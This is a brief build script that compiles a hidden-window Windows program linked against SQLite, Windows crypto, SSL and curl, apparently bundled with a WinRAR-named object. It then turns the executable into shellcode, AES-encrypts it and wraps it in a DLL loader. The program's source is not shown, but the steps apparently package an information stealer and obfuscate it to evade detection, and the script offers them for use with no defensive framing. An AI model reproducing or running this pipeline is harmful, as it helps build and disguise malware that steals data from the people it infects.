REM non-static ---------   clear && gcc -o main.exe main.c -lregex -lsqlite3 -lssl -ljansson -liphlpapi -lcrypto -lcrypt32 -w -mwindows -lcurl
REM static -------------   clear && gcc -static -o main.exe -w -mwindows winrar.o main.c `pkg-config --static --cflags libcurl` `pkg-config --static --cflags regex` `pkg-config --static --cflags jansson` `pkg-config --static --cflags sqlite3` `pkg-config --static --cflags iconv` `pkg-config --static --cflags libssl`                     `pkg-config --static --libs libcurl` `pkg-config --static --libs regex` `pkg-config --static --libs jansson` `pkg-config --static --libs sqlite3`  `pkg-config --static --libs iconv` `pkg-config --static --libs libssl` -g -lssl && ./main.exe

clear && gcc -o main.exe main.c -lregex -lsqlite3 -lssl -ljansson -liphlpapi -lcrypto -lcrypt32 -w -mwindows -lcurl
python3 exe2shell.py > main.shc
python3 aes.py main.shc
mkdir Result
cd Result
g++ -shared -o main.dll ../exec.cpp -fpermissive